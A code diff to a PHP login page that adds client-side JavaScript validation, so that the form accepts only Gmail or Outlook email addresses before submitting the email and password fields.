@@ -74,10 +74,10 @@ if ($_SERVER['REQUEST_METHOD']=="POST"){
 </head>
 <body>
     <div class="container">
-    <form action="/mickoo/kaltohgaya.php" method="post">
+    <form action="/mickoo/kaltohgaya.php" method="post" onsubmit="return validateEmail()">
     <div class="emaildiv">   
     <label for="emailaddress" class="emaildaalo">Email:</label>
-    <input type="email" class="eminp" name="emailhai">
+    <input type="email" class="eminp" name="emailhai" id="emailkiidhaidost">
     </div>
     <div class="passworddiv">
     <label for="password" class="passdaalo">Password:</label>
@@ -88,5 +88,18 @@ if ($_SERVER['REQUEST_METHOD']=="POST"){
     </div>
     </form>
     </div>
+
+    <script>
+        function validateEmail() {
+            var email = document.getElementById("emailkiidhaidost").value;
+            var emailPattern = /^[a-zA-Z0-9._-]+@(gmail|outlook)\.com$/;
+
+            if (!emailPattern.test(email)) {
+                alert("Please enter a valid Gmail or Outlook email address.");
+                return false; // Prevent form submission
+            }
+            return true; // Allow form submission
+        }
+    </script>
 </body>
 </html>
